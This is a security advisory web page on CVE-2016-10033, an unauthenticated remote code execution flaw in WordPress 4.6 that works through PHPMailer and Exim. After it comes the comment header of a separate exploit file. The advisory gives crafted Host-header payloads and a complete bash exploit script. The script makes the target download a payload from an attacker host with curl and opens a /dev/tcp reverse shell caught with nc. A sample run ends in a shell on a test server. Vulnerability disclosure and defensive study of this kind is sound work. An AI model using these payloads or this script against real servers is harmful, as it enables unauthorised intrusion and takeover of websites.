=== Content from exploitbox.io_703a9a92_20250126_062422.html ===


[Brand
![](../assets/img/logo.png)](../index.html)

* Stay Tuned

```

====================================================
- Discovered by: Dawid Golunski ([@dawid_golunski](https://twitter.com/dawid_golunski))
- dawid[at]legalhackers.com
- <https://legalhackers.com>
-
- [ExploitBox.io](https://ExploitBox.io) ([@Exploit_Box](https://twitter.com/Exploit_Box))

- CVE-2016-10033
- Release date: 03.05.2017
- Revision 2.0
- Last  update: 04.05.2017
- Severity: Critical
====================================================

I. VULNERABILITY
-------------------------

WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) PoC Exploit
		     (default configuration, no plugins, no auth)

II. BACKGROUND
-------------------------

"WordPress is a free and open-source content management system
(CMS) based on PHP and MySQL.

WordPress was used by more than 27.5% of the top 10 million
websites as of February 2017. WordPress is reportedly the
most popular website management or blogging system in
use on the Web, supporting more than 60 million websites."

<https://en.wikipedia.org/wiki/WordPress>

III. INTRODUCTION
-------------------------

This advisory reveals details of exploitation of the PHPMailer
vulnerability (CVE-2016-10033) in WordPress Core which (contrary to what
was believed and announced by WordPress security team) was affected by the
vulnerability.

The Remote Code Execution attack could be used by unauthenticated remote attackers
to gain instant access to the target server on which a vulnerable WordPress
core version was installed in its default configuration which could lead
to a full compromise of the target application server.
No plugins or non-standard settings are required to exploit the vulnerability.

This advisory reveals new exploitation vectors for PHP mail()
function discovered by the author that allow to exploit the vulnerability on a
most popular MTA (Mail Transfer Agent) - Exim which can be found installed by
default on many system such as Debian or Ubuntu, as opposed to rarely used
Sendmail MTA that has been thought to be a requirement for mail() injection
attacks to date.

Due to critical severity of this vulnerability, disclosure of new
exploitation vectors that increase the range of this type of attacks, and the ease
of mass exploitation, the release of this advisory was delayed by an
extended period of time to allow WordPress and other potentially affected
software vendors enough time to update affected mail libraries.

IV. DESCRIPTION
-------------------------

The following snippet of code from WordPress 4.6 - file wp-includes/pluggable.php:

      if ( !isset( $from_email ) ) {
              // Get the site domain and get rid of www.
              $sitename = strtolower( $_SERVER['SERVER_NAME'] );
              if ( substr( $sitename, 0, 4 ) == 'www.' ) {
                      $sitename = substr( $sitename, 4 );
              }

              $from_email = 'wordpress@' . $sitename;
      }

      /**
       * Filters the name to associate with the "from" email address.
       *
       * @since 2.3.0
       *
       * @param string $from_name Name associated with the "from" email address.
       */
      $from_name = apply_filters( 'wp_mail_from_name', $from_name );

      $phpmailer->setFrom( $from_email, $from_name );

shows that WordPress sets the email domain based on SERVER_NAME server
header when WordPress wp_mail() function is called to send an email (e.g. upon
user registration, forgotten password etc.).

As we can see the from address is formed as follows:

$from_email = 'wordpress@' . $sitename;

It is then filtered and passed to a vulnerable setFrom() function of PHPMailer which
was explained in detail in the previous advisories:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

Injection
==============

SERVER_NAME server header can be manipulated on default configurations of Apache
Web server (most common WordPress deployment) via HOST header of a HTTP request.

To illustrate, here is a request and response of a simple php script vars.php that
simply prints out relevant parts of server headers ($_SERVER PHP array):

GET /vars.php HTTP/1.1
Host: xenialINJECTION

HTTP/1.1 200 OK
Server: Apache

Array
(
  [HTTP_HOST] => xenialINJECTION
  [SERVER_SOFTWARE] => Apache/2.4.18 (Ubuntu)
  [SERVER_NAME] => xenialinjection
...

As we can see, INJECTION string appended to the hostname in HOST header gets
copied to both HTTP_HOST and SERVER_NAME  PHP variables.

Using this HOST header example, if an attacker triggered wp_mail() function
by using the forgotten password WordPress feature, the HTTP request would be similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenialINJECT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close

user_login=admin&redirect_to=&wp-submit=Get+New+Password

and would result in the following parameters passed to /usr/sbin/sendmail :

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenialinject]

What is interesting here is the 3rd parameter. The domain part of the email
matches the HOST header of the request, except for lower-case "inject".

Bypassing the filters
=======================

To exploit the PHPMailer's mail() injection vulnerability, an attacker would
have to be able to append parameters to the domain part.
However, the filtration/validation in
place (both on the wordpress side as well as PHPMailer library side) would
prevent the attacker from injecting white-characters (such as space
or TAB) and therefore from injecting parameters to sendmail binary.

For example, if attacker modified the HOST header to the following:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenialINJECT SPACE

the validation would result in invalid domain part error and WordPress
application would exit with http response of:

HTTP/1.0 500 Internal Server Error

In which case wp_mail() and therefore the vulnerable PHPMailer
functions would never be reached (sendmail binary would not be executed).

The validateAddress() function of PHPMailer library as well as PHP's
filter_var/FILTER_VALIDATE_EMAIL are both complient with RFC 822 standard
as we can read at:

<http://php.net/manual/en/filter.filters.validate.php>

which prohibits spaces in the domain part and thus prevents injection
of additional parameters to /usr/sbin/sendmail.

It should be noted that the technique of injecting additional \ backslash
characters to the username part of the email presented in PHPMailer advisory:
<http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

would not be an option for the attacker as username part of the from
address cannot be controlled in this case.

RFC 822 and comment syntax
--------------

Looking at the RFC 822 specs however, a potential way to bypass the validation
was found. According to:
<https://www.ietf.org/rfc/rfc822.txt>

email addresses can contain comments:

"
3.4.3.  COMMENTS

      A comment is a set of ASCII characters, which is  enclosed  in
      matching  parentheses  and which is not within a quoted-string
      The comment construct permits message originators to add  text
      which  will  be  useful  for  human readers, but which will be
      ignored by the formal semantics.  Comments should be  retained
      while  the  message  is subject to interpretation according to
      this standard.  However, comments  must  NOT  be  included  in
      other  cases,  such  as  during  protocol  exchanges with mail
      servers.
"

The document gives an email example of with comments in brackets:

":sysmail"@  Some-Group. Some-Org,
          Muhammed.(I am  the greatest) Ali @(the)Vegas.WBA

as a valid email.

A simplified comment example within the domain part would be:

john@example.com(comment)

After further testing, it turned out that comment part can contain spaces
in the domain part, and could be used as a way to bypass the
validation of the domain part and inject additional parameters to
sendmail binary.

Injecting parameters via comment syntax
----------------

The following request with the HOST header set to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 injected tmp2)

will not cause errors and will result in the following parameters supplied to
sendmail :

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [injected]
Arg no. 5 == [tmp2)]

As we can see, We have managed to bypass filters/validation provided by

Wordpress filter:

apply_filters( 'wp_mail_from_name', $from_name );

As well as PHPMailer's internal setFrom() validation.

We now have control over the 4th parameter ('injected') and can inject
more parameters inbeetwen arg no.3 and no.5 if necessary.

In theory we should now be able to inject additional parameters to
/usr/sbin/sendmail wrapper to achieve arbitrary code execution.

Code Execution via Sendmail MTA
=================================

To date, the only known way of achieving remote code execution via
PHP mail() exploitation relied on Sendmail MTA being present on the
target system.

The most common Sendmail MTA vector is similar to:

-OQueueDirectory=/tmp/ -X/var/www/html/backdoor.php

It typically writes out a log file with a php backdoor contained within the
input message.

There are 2 problems with this technique however:

1)
Sendmail MTA is not commonly used anymore as we can verify by looking
at the statistics at:

<http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html>

which show that Sendmail is the least popular among Linux MTAs.

It does not ship with any modern Linux distribution and it is not
very likely for it to be found installed on a target.

2)
The Sendmail technique presented above would not work in the case
of the WordPress vulnerability discussed in this advisory.
As previously mentioned, hostname copied to SERVER_NAME server
variable gets converted into lower-case and therefore injecting
Sendmail parameters in a request similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -O -X tmp2)

would result in the follwing set of sendmail arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-o]
Arg no. 5 == [-x]
Arg no. 6 == [tmp2)]

Sendmail would fail with an error as arguments are case-sensitive
and neither -q nor -x would work.

Code execution via Exim4 MTA
=================================

While researching the other vulnerabilities in email sending
libraries (see previously published advisories for PHPMailer, ZendMail,
Swiftmailer), the author of this advisory discovered a new way to
achieve command execution with the help of Exim MTA that was
previously thought to be immune to mail() injection attacks.

This technique has been documented in the white-paper :
["Pwning PHP mail() function For Fun And Remote Code Execution"](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

The ability to execute commands through Exim4 MTA opens up many
possibilities in regards to exploitation not only of already disclosed
vulnerabilities in PHPMailer and other email libraries, but also in
regards to mail() function exploitation in general as Exim4 is the
most popular MTA available by default on popular Linux distributions
such as Debian.

The survey confirms the popularity of exim:
<http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html>

This increases the chances of it being present on the remote target
and is ideal for a reliable proof of concept exploit of the vulnerability
presented in this advisory.

Direct code execution with Exim4 MTA
--------------------------------

The discovered Exim MTA vector, in its most basic form works
in the following way:

sendmail -be '${run{/bin/true}{true}{false}}'
true

The -be switch enables string expansion testing mode.
The above expansion executes /bin/true and returns the value from
the brackets based on the exit code.

Similarly, the expansion:
sendmail -be '${run{/bin/bash -c "id"}{yes}{no}}'

would execute id command.

Note: on systems with Exim4, /usr/sbin/sendmail is just a symlink:
/usr/sbin/sendmail -> exim4
and has nothing to do with Sendmail MTA.
Sendmail MTA is not required to be present on the system for the
technique to work.

What is very powerful about this vector is that command
execution can be achieved in a reliable way directly through the
$run expansion specified as an argument and does not require
writing files to /var/www/html or guessing directory paths
which is the case in already known Sendmail MTA vector.

HOST header restrictions
----------------------------------

The seemingly simple Exim4 vector turned out to be tricky in practice
since the presented above expansion string would not work within HOST header.

A HTTP request similar to:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 slash/ -X tmp2)

would be rejected by Apache webserver due to / (slash) character
present within the HOST header.
The $run function would not
work without it as it requires  a full path to the binary that is being
executed (suggesting that exim4 uses exec() to run it and does
not execute commands through system() ).

Bypassing restrictions
==============================

To bypass restriction of the HOST header several methods
were attempted by studying available Exim expansion strings at:

<http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html>

Embeded perl
----------------------

One of the expansions that was considered was:
${perl{foo}{argument1}{argument2} ... }

however perl is not enabled by default on Exim and therefore
would not make the exploit reliable.

Encoding
---------------------

The family of base64 and HEX encoding/decoding functions were tested
but they did not seem to be supported by exim4 used for testing and
would result in errors such as:

sendmail -be '${base64d:QUI=}'
Failed: unknown expansion operator "base64d"

Substrings & Environment variables
---------------------

Another idea was to use known environment variables in combination
with substrings to extract forbidden slash character.

For example, the PATH environment variable contains slash:

PATH=/bin:/usr/bin

and therefore was a good candidate.

${env{PATH}} could be used to retrieve the variable and when
connected with $substring expansion, slash could be obtained
as can be seen in the following command:

sendmail -be '${substr{0}{1}{${env{PATH}}}}'
/

Unfortunately, this technique led to a dead-end as environment
variables such as PATH when inserted within HOST header would
be converted to lower-case and thus not work under Linux.

Substrings & internal exim4 variables
--------------------------------------

With trial and error, the following variable was found to work
as expected:

sendmail -be '${spool_directory}'
/var/spool/exim4

The spool_directory variable is present by default, and does
not have capital letters  and therefore would work reliably.

The slash character could now be replaced with:

${substr{0}{1}{$spool_directory}}

to bypass the slash restriction of the HOST header.

The following expansion:

sendmail -be '${run{/usr/bin/touch /tmp/test}}'

Could now be converted to:

sendmail -be '${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch ${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}'

This worked fine under terminal however when tested within a HTTP request:

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch ${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}  tmp2)

it would result in the following sendmail parameters:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-be]
Arg no. 5 == [${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch]
Arg no. 6 == [${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}]
Arg no. 7 == [tmp2)]

As we can see, the expansion payload got broken into 2 arguments 5 & 6
instead of one.
This prevented Exim from executing the payload properly.

The problem was caused by spaces between command parameters (e.g. space after
'touch')

Replacing spaces
------------------

First the environment variable IFS was considered, however
environment variables would not work properly as previously tested.

After further research a convenient internal exim variable was found:

sendmail -be '${tod_log}'
2016-01-02 23:49:42

the tod_log variable returns current date in format that contains a space.

Similar to the slash replacement, $substring + $tod_log variable could
be used to replace the space as was tested with:

sendmail -be '${substr{10}{1}{$tod_log}}'

PoC HTTP request / minimal PoC exploit
====================================

POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1
Host: xenial(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}  tmp2)
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

user_login=admin&redirect_to=&wp-submit=Get+New+Password

The above request when sent to WordPress core application would cause exim
to be called with the following arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fwordpress@xenial(tmp1]
Arg no. 4 == [-be]
Arg no. 5 == [${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}}]
Arg no. 6 == [tmp2)]

which would execute:
/usr/bin/touch /tmp/test

on the target and create a file /tmp/test as tested on WordPress 4.6.

Using this payload logic a working exploit was built which executes
a reverse shell on the target.

V. PROOF OF CONCEPT EXPLOIT CODE
-------------------------

#!/bin/bash
#
#      __                     __   __  __           __
#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
#            /____/
#
#
# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
# CVE-2016-10033
#
# wordpress-rce-exploit.sh (ver. 1.0)
#
#
# Discovered and coded by
#
# Dawid Golunski (@dawid_golunski)
# https://legalhackers.com
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
#
# Exploit src URL:
# https://exploitbox.io/exploit/wordpress-rce-exploit.sh
#
#
# Tested on WordPress 4.6:
# https://github.com/WordPress/WordPress/archive/4.6.zip
#
# Usage:
# ./wordpress-rce-exploit.sh target-wordpress-url
#
#
# Disclaimer:
# For testing purposes only
#
#
# -----------------------------------------------------------------
#
# Interested in vulns/exploitation?
#
#
#                        .;lc'
#                    .,cdkkOOOko;.
#                 .,lxxkkkkOOOO000Ol'
#             .':oxxxxxkkkkOOOO0000KK0x:'
#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
#     .dxxxxxdl;. .,               .. .;cdxxxxxx:
#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
#             .':oxxxxxxxxx.ckkkkkkkkxl,.
#                 .,cdxxxxx.ckkkkkxc.
#                    .':odx.ckxl,.
#                        .,.'.
#
# <https://ExploitBox.io>
#
# <https://twitter.com/Exploit_Box>
#
# -----------------------------------------------------------------

rev_host="192.168.57.1"

function prep_host_header() {
      cmd="$1"
      rce_cmd="\${run{$cmd}}";

      # replace / with ${substr{0}{1}{$spool_directory}}
      #sed 's^/^${substr{0}{1}{$spool_directory}}^g'
      rce_cmd="`echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"

      # replace ' ' (space) with
      #sed 's^ ^${substr{10}{1}{$tod_log}}$^g'
      rce_cmd="`echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"
      #return "target(any -froot@localhost -be $rce_cmd null)"
      host_header="target(any -froot@localhost -be $rce_cmd null)"
      return 0
}

#cat exploitbox.ans
intro="
DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r
bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f
G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c
G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg
IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f
IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f
X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6
b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb
NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N
TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1
QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz
NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g
G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54
eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb
WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO
TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg
ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb
MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD
G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob
WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz
NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb
MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f
X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4
bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"
intro2="
ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09
fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb
MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE
aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09
fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg
ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh
bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt
ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp
bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1
cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg=="
echo "$intro"  | base64 -d
echo "$intro2" | base64 -d

if [ "$#" -ne 1 ]; then
echo -e "Usage:\n$0 target-wordpress-url\n"
exit 1
fi
target="$1"
echo -ne "\e[91m[*]\033[0m"
read -p " Sure you want to get a shell on the target '$target' ? [y/N] " choice
echo

if [ "$choice" == "y" ]; then

echo -e "\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"
echo -e "\e[92m[+]\033[0m Connected to the target"

# Serve payload/bash script on :80
RCE_exec_cmd="(sleep 3s && nohup bash -i >/dev/tcp/$rev_host/1337 0<&1 2>&1) &"
echo "$RCE_exec_cmd" > rce.txt
python -mSimpleHTTPServer 80 2>/dev/null >&2 &
hpid=$!

# Save payload on the target in /tmp/rce
cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
prep_host_header "$cmd"
curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword
echo -e "\n\e[92m[+]\e[0m Payload sent successfully"

# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
cmd="/bin/bash /tmp/rce"
prep_host_header "$cmd"
curl -H"Host: $host_header" -d 'user_login=admin&wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &
echo -e "\n\e[92m[+]\033[0m Payload executed!"

echo -e "\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"
nc -vv -l 1337
echo
else
echo -e "\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"
exit 0

fi

echo "Exiting..."
exit 0

Video PoC
~~~~~~~~~~~~

Example run
~~~~~~~~~~~~~~~

# ./wordpress-rce-exploit.sh <http://wp-host/wordpress/>

                        .;lc'
                    .,cdkkOOOko;.
 _______        ., ________     ________      _______
 \  ___/_ ____ '___\      /_____\      _______\_   _/_
 /  _/   \\   \/   /   __/     //   |  \_____//       \
/_________>>      < __/  /    /-\ ____ /     \ _______/
          <___/\___>    /________/    /_______>
     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
     .dxxxxxdl;. .,               .. .;cdxxxxxx:
     .dxxxx ________          ____  _____ xxxxx:
      .':ox \      /_ ________\   \/    / xxc,.
          . /     /  \\        >       <  x,
           /          /   |   /   /\    \
           \_________<_______<____> \____>
                    .':odx.ckxl,.
                        .,.'.

                 | ExploitBox.io |

+ --=| Wordpress Core - Unauthenticated RCE Exploit  |
+ --=|                                               |
+ --=|          Discovered & Coded By                |
+ --=|               Dawid Golunski                  |
+ --=|         <https://legalhackers.com>              |
+ --=|                                               |
+ --=| "With Great Power Comes Great Responsibility" |
+ --=|        * For testing purposes only *          |

[*] Sure you want to get a shell on the target '[http://wp-host/wordpress/'](http://wp-host/wordpress/%27) ? [y/N] y

[*] Guess I can't argue with that... Let's get started...

[+] Connected to the target

[+] Payload sent successfully

[+] Payload executed!

[*] Waiting for the target to send us a reverse shell...

Listening on [0.0.0.0] (family 0, port 1337)
Connection from [192.168.57.3] port 1337 [tcp/*] accepted (family 2, sport 39232)
bash: cannot set terminal process group (10408): Inappropriate ioctl for device
bash: no job control in this shell
www-data@xenial:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@xenial:/$ exit
exit
exit

Exiting...

VI. BUSINESS IMPACT
-------------------------

Upon a successfull exploitation, a remote unauthenticated attacker
would be able to execute arbitrary code on the target server and compromise
the target application.

VII. SYSTEMS AFFECTED
-------------------------

The Remote Code Execution PoC exploit described in this advisory is based
on version 4.6 although other versions of WordPress (prior to 4.7.1 which
fixed the PHPMailer vulnerability) might also be affected.

The advisory presents the exploitation on the example of Exim MTA,
the author has also developed another exploit that can also be used on
other MTA software. The exploit will be shared shortly after this advisory.

VIII. SOLUTION
-------------------------

Update to the latest version of WordPress.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

<https://ExploitBox.io>

Vulnerable WordPress version used for testing/exploitation:
<https://github.com/WordPress/WordPress/archive/4.6.zip>

Exploit code:
[WordPress Core 4.6 - Unauth Remote Code Execution PoC Exploit](https://ExploitBox.io/exploit/wordpress-rce-exploit.sh)

Video PoC:
<https://www.youtube.com/watch?v=ZFt_S5pQPX0>

WordPress security team announcement regarding phpmailer:
<https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/>

WordPress security team response to phpmailer
https://core.trac.wordpress.org/ticket/37210#trac-change-14-1482913077988770

Vendor site:
<https://wordpress.org>

Related advisories:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

X. CREDITS
-------------------------

The vulnerabilities and exim mail() injection vector presented in this advisory
were discovered by :

Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>
[ExploitBox.io](https://ExploitBox.io) ([@Exploit_Box](https://twitter.com/Exploit_Box))

XI. REVISION HISTORY
-------------------------

03.05.2017 - Advisory released, rev. 1

04.05.2017 - Revision 2. Updated introduction to help separate different issues.

XII. EXPLOITBOX - A PLAYGROUND FOR HACKERS
-------------------------

ExploitBox.io is coming soon.
Subscribe at <https://ExploitBox.io> to stay updated and be there for the launch.

XIII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

```

[![](../assets/img/logo.png)](https://ExploitBox.io)

**COMING SOON** **█**



=== Content from raw.githubusercontent.com_7789922f_20250126_062520.html ===
#!/usr/bin/python
#
# Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA]
# Date: [16/06/2017]
# Exploit Author: [@phackt\_ul]
# Software Link: [https://github.com/PHPMailer/PHPMailer]
# Version: [< 5.2.20]
# Tested on: [Debian x86/x64]
# CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045]
#
# @phackt\_ul - https://phackt.com
#
# All credits go to Dawid Golunski (@dawid\_golunski) - https://legalhackers.com
# and its research on PHP libraries vulns
#
